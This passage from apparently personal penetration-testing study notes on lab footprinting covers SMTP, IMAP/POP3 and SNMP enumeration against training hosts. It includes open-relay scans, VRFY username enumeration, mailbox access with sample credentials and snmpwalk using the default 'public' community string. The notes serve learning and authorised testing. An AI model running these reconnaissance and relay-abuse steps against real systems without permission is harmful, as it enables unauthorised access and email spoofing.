    <tr>
      <td><code class="language-plaintext highlighter-rouge">QUIT</code></td>
      <td>The client terminates the session.</td>
    </tr>
  </tbody>
</table>

<p>To interact with the SMTP server, we can use the <code class="language-plaintext highlighter-rouge">telnet</code> tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, <code class="language-plaintext highlighter-rouge">HELO</code> or <code class="language-plaintext highlighter-rouge">EHLO</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: &lt;cry0l1t3@inlanefreight.htb&gt;

250 2.1.0 Ok


RCPT TO: &lt;mrb3n@inlanefreight.htb&gt; <span class="nv">NOTIFY</span><span class="o">=</span>success,failure

250 2.1.5 Ok


DATA

354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;

From: &lt;cry0l1t3@inlanefreight.htb&gt;
To: &lt;mrb3n@inlanefreight.htb&gt;
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don<span class="s1">'t work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
</span></code></pre></div></div>

<h2 id="dangerous-settings-2">Dangerous Settings</h2>

<p>To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.</p>

<p>Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.</p>

<h4 id="open-relay-configuration">Open Relay Configuration</h4>

<p>SMTP</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mynetworks = 0.0.0.0/0
</code></pre></div></div>

<p>With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap 10.129.14.128 <span class="nt">-p25</span> <span class="nt">--script</span> smtp-open-relay <span class="nt">-v</span>


PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay <span class="o">(</span>16/16 tests<span class="o">)</span>
|  MAIL FROM:&lt;<span class="o">&gt;</span> -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@ESMTP&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.129.14.128]&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@ESMTP&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;<span class="s2">"relaytest@nmap.scanme.org"</span><span class="o">&gt;</span>
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;<span class="s2">"relaytest%nmap.scanme.org"</span><span class="o">&gt;</span>
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@[10.129.14.128]&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;<span class="s2">"relaytest@nmap.scanme.org"</span>@[10.129.14.128]&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@ESMTP&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@[10.129.14.128]:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@ESMTP:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;
|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.129.14.128]&gt;
|_ MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@ESMTP&gt;


</code></pre></div></div>
<p>SMTP ENUM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> /home/nullbyte/SecLists/smtp/footprinting-wordlist.txt <span class="nt">-t</span> 10.129.19.6 <span class="nt">-w</span> 15 <span class="nt">-v</span>    
Starting smtp-user-enum v1.2 <span class="o">(</span> http://pentestmonkey.net/tools/smtp-user-enum <span class="o">)</span>  
  
<span class="nt">----------------------------------------------------------</span>  
|                   Scan Information                       |  
<span class="nt">----------------------------------------------------------</span>  
  
Mode ..................... VRFY  
Worker Processes ......... 5  
Usernames file ........... /home/nullbyte/SecLists/smtp/footprinting-wordlist.txt  
Target count ............. 1  
Username count ........... 101  
Target TCP port .......... 25  
Query <span class="nb">timeout</span> ............ 15 secs  
Target domain ............
</code></pre></div></div>

<h1 id="imap--pop3">IMAP / POP3</h1>

<hr />

<p>With the help of the <code class="language-plaintext highlighter-rouge">Internet Message Access Protocol</code> (<code class="language-plaintext highlighter-rouge">IMAP</code>), access to emails from a mail server is possible. Unlike the <code class="language-plaintext highlighter-rouge">Post Office Protocol</code> (<code class="language-plaintext highlighter-rouge">POP3</code>), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p>

<p>The client establishes the connection to the server via port <code class="language-plaintext highlighter-rouge">143</code>. For communication, it uses text-based commands in <code class="language-plaintext highlighter-rouge">ASCII</code> format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.</p>

<p>SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port <code class="language-plaintext highlighter-rouge">143</code> or an alternative port such as <code class="language-plaintext highlighter-rouge">993</code>.</p>

<h4 id="imap-commands">IMAP Commands</h4>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 LOGIN username password</code></td>
      <td>User’s login.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 LIST "" *</code></td>
      <td>Lists all directories.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 CREATE "INBOX"</code></td>
      <td>Creates a mailbox with a specified name.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 DELETE "INBOX"</code></td>
      <td>Deletes a mailbox.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 RENAME "ToRead" "Important"</code></td>
      <td>Renames a mailbox.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 LSUB "" *</code></td>
      <td>Returns a subset of names from the set of names that the User has declared as being <code class="language-plaintext highlighter-rouge">active</code> or <code class="language-plaintext highlighter-rouge">subscribed</code>.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 SELECT INBOX</code></td>
      <td>Selects a mailbox so that messages in the mailbox can be accessed.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 UNSELECT INBOX</code></td>
      <td>Exits the selected mailbox.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 FETCH &lt;ID&gt; all</code></td>
      <td>Retrieves data associated with a message in the mailbox.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 CLOSE</code></td>
      <td>Removes all messages with the <code class="language-plaintext highlighter-rouge">Deleted</code> flag set.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1 LOGOUT</code></td>
      <td>Closes the connection with the IMAP server.</td>
    </tr>
  </tbody>
</table>

<h4 id="pop3-commands">POP3 Commands</h4>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">USER username</code></td>
      <td>Identifies the user.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PASS password</code></td>
      <td>Authentication of the user using its password.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">STAT</code></td>
      <td>Requests the number of saved emails from the server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">LIST</code></td>
      <td>Requests from the server the number and size of all emails.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">RETR id</code></td>
      <td>Requests the server to deliver the requested email by ID.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DELE id</code></td>
      <td>Requests the server to delete the requested email by ID.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">CAPA</code></td>
      <td>Requests the server to display the server capabilities.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">RSET</code></td>
      <td>Requests the server to reset the transmitted information.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">QUIT</code></td>
      <td>Closes the connection with the POP3 server.</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="dangerous-settings-3">Dangerous Settings</h2>

<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth_debug</code></td>
      <td>Enables all authentication debug logging.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth_debug_passwords</code></td>
      <td>This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth_verbose</code></td>
      <td>Logs unsuccessful authentication attempts and their reasons.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth_verbose_passwords</code></td>
      <td>Passwords used for authentication are logged and can also be truncated.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth_anonymous_username</code></td>
      <td>This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism</td>
    </tr>
  </tbody>
</table>

<h2 id="footprinting-the-service">Footprinting the Service</h2>

<p>By default, ports <code class="language-plaintext highlighter-rouge">110</code> and <code class="language-plaintext highlighter-rouge">995</code> are used for POP3, and ports <code class="language-plaintext highlighter-rouge">143</code> and <code class="language-plaintext highlighter-rouge">993</code> are used for IMAP. The higher ports (<code class="language-plaintext highlighter-rouge">993</code> and <code class="language-plaintext highlighter-rouge">995</code>) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nmap 10.129.14.128 <span class="nt">-sV</span> <span class="nt">-p110</span>,143,993,995 <span class="nt">-sC</span>

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 22:09 CEST
Nmap scan report <span class="k">for </span>10.129.14.128
Host is up <span class="o">(</span>0.00026s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>mail1.inlanefreight.htb/organizationName<span class="o">=</span>Inlanefreight/stateOrProvinceName<span class="o">=</span>California/countryName<span class="o">=</span>US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>mail1.inlanefreight.htb/organizationName<span class="o">=</span>Inlanefreight/stateOrProvinceName<span class="o">=</span>California/countryName<span class="o">=</span>US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>mail1.inlanefreight.htb/organizationName<span class="o">=</span>Inlanefreight/stateOrProvinceName<span class="o">=</span>California/countryName<span class="o">=</span>US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL<span class="o">(</span>PLAIN<span class="o">)</span> TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>mail1.inlanefreight.htb/organizationName<span class="o">=</span>Inlanefreight/stateOrProvinceName<span class="o">=</span>California/countryName<span class="o">=</span>US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 <span class="o">(</span>VMware<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.74 seconds
</code></pre></div></div>

<h4 id="curl">cURL</h4>

<p>IMAP / POP3</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>curl <span class="nt">-k</span> <span class="s1">'imaps://10.129.14.128'</span> <span class="nt">--user</span> user:p4ssw0rd

<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> Important
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> INBOX
</code></pre></div></div>

<h4 id="openssl---tls-encrypted-interaction-pop3">OpenSSL - TLS Encrypted Interaction POP3</h4>

<p>IMAP / POP3</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 10.129.14.128:pop3s

CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
Can<span class="s1">'t use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...
</span></code></pre></div></div>

<h4 id="openssl---tls-encrypted-interaction-imap">OpenSSL - TLS Encrypted Interaction IMAP</h4>

<p>IMAP / POP3</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 10.129.14.128:imaps

CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
Can<span class="s1">'t use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP..
</span></code></pre></div></div>

<h1 id="snmp-1">SNMP</h1>

<hr />

<p><code class="language-plaintext highlighter-rouge">Simple Network Management Protocol</code> (<a href="https://datatracker.ietf.org/doc/html/rfc1157">SNMP</a>) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is <code class="language-plaintext highlighter-rouge">SNMPv3</code>, which increases the security of SNMP in particular, but also the complexity of using this protocol.</p>

<p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port <code class="language-plaintext highlighter-rouge">161</code>. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called <code class="language-plaintext highlighter-rouge">traps</code> over UDP port <code class="language-plaintext highlighter-rouge">162</code>. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p>

<p>For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.</p>

<h4 id="mib">MIB</h4>

<p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the <code class="language-plaintext highlighter-rouge">Management Information Base</code> (<code class="language-plaintext highlighter-rouge">MIB</code>) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one <code class="language-plaintext highlighter-rouge">Object Identifier</code> (<code class="language-plaintext highlighter-rouge">OID</code>), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the <code class="language-plaintext highlighter-rouge">Abstract Syntax Notation One</code> (<code class="language-plaintext highlighter-rouge">ASN.1</code>) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p>

<h4 id="oid">OID</h4>

<p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node’s position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the <a href="https://www.alvestrand.no/objectid/">Object Identifier Registry</a>.</p>

<h4 id="snmpv1">SNMPv1</h4>

<p>SNMP version 1 (<code class="language-plaintext highlighter-rouge">SNMPv1</code>) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has <code class="language-plaintext highlighter-rouge">no built-in authentication</code> mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it <code class="language-plaintext highlighter-rouge">does not support encryption</code>, meaning that all data is sent in plain text and can be easily intercepted.</p>

<h4 id="snmpv2">SNMPv2</h4>

<p>SNMPv2 existed in different versions. The version still exists today is <code class="language-plaintext highlighter-rouge">v2c</code>, and the extension <code class="language-plaintext highlighter-rouge">c</code> means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the <code class="language-plaintext highlighter-rouge">community string</code> that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p>

<h4 id="snmpv3">SNMPv3</h4>

<p>The security has been increased enormously for <code class="language-plaintext highlighter-rouge">SNMPv3</code> by security features such as <code class="language-plaintext highlighter-rouge">authentication</code> using username and password and transmission <code class="language-plaintext highlighter-rouge">encryption</code> (via <code class="language-plaintext highlighter-rouge">pre-shared key</code>) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than <code class="language-plaintext highlighter-rouge">v2c</code>.</p>

<p>#snmpwalk</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>snmpwalk <span class="nt">-v2c</span> <span class="nt">-c</span> public 10.129.14.128

iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"</span>
iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>5134<span class="o">)</span> 0:00:51.34
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"mrb3n@inlanefreight.htb"</span>
iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"htb"</span>
iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Sitting on the Dock of the Bay"</span>
iso.3.6.1.2.1.1.7.0 <span class="o">=</span> INTEGER: 72
iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 <span class="o">=</span> OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 <span class="o">=</span> OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 <span class="o">=</span> OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 <span class="o">=</span> OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 <span class="o">=</span> OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 <span class="o">=</span> OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 <span class="o">=</span> OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 <span class="o">=</span> OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 <span class="o">=</span> OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 <span class="o">=</span> OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 <span class="o">=</span> STRING: <span class="s2">"The SNMP Management Architecture MIB."</span>
iso.3.6.1.2.1.1.9.1.3.2 <span class="o">=</span> STRING: <span class="s2">"The MIB for Message Processing and Dispatching."</span>
iso.3.6.1.2.1.1.9.1.3.3 <span class="o">=</span> STRING: <span class="s2">"The management information definitions for the SNMP User-based Security Model."</span>
iso.3.6.1.2.1.1.9.1.3.4 <span class="o">=</span> STRING: <span class="s2">"The MIB module for SNMPv2 entities"</span>
iso.3.6.1.2.1.1.9.1.3.5 <span class="o">=</span> STRING: <span class="s2">"View-based Access Control Model for SNMP."</span>
iso.3.6.1.2.1.1.9.1.3.6 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing TCP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.7 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing IP and ICMP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.8 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing UDP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.9 <span class="o">=</span> STRING: <span class="s2">"The MIB modules for managing SNMP Notification, plus filtering."</span>
iso.3.6.1.2.1.1.9.1.3.10 <span class="o">=</span> STRING: <span class="s2">"The MIB module for logging SNMP Notifications."</span>
iso.3.6.1.2.1.1.9.1.4.1 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 <span class="o">=</span> Timeticks: <span class="o">(</span>3676678<span class="o">)</span> 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 <span class="o">=</span> Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 <span class="o">=</span> INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 <span class="o">=</span> STRING: <span class="s2">"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"</span>
iso.3.6.1.2.1.25.1.5.0 <span class="o">=</span> Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 <span class="o">=</span> Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 <span class="o">=</span> INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 <span class="o">=</span> No more variables left <span class="k">in </span>this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 <span class="o">=</span> STRING: <span class="s2">"printer-driver-sag-gdi_0.1-7_all"</span>
iso.3.6.1.2.1.25.6.3.1.2.1233 <span class="o">=</span> STRING: <span class="s2">"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1234 <span class="o">=</span> STRING: <span class="s2">"procps_2:3.3.16-1ubuntu2.3_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1235 <span class="o">=</span> STRING: <span class="s2">"proftpd-basic_1.3.6c-2_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1236 <span class="o">=</span> STRING: <span class="s2">"proftpd-doc_1.3.6c-2_all"</span>
iso.3.6.1.2.1.25.6.3.1.2.1237 <span class="o">=</span> STRING: <span class="s2">"psmisc_23.3-1_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1238 <span class="o">=</span> STRING: <span class="s2">"publicsuffix_20200303.0012-1_all"</span>
iso.3.6.1.2.1.25.6.3.1.2.1239 <span class="o">=</span> STRING: <span class="s2">"pulseaudio_1:13.99.1-1ubuntu3.12_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1240 <span class="o">=</span> STRING: <span class="s2">"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1241 <span class="o">=</span> STRING: <span class="s2">"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1242 <span class="o">=</span> STRING: <span class="s2">"python-apt-common_2.0.0ubuntu0.20.04.6_all"</span>
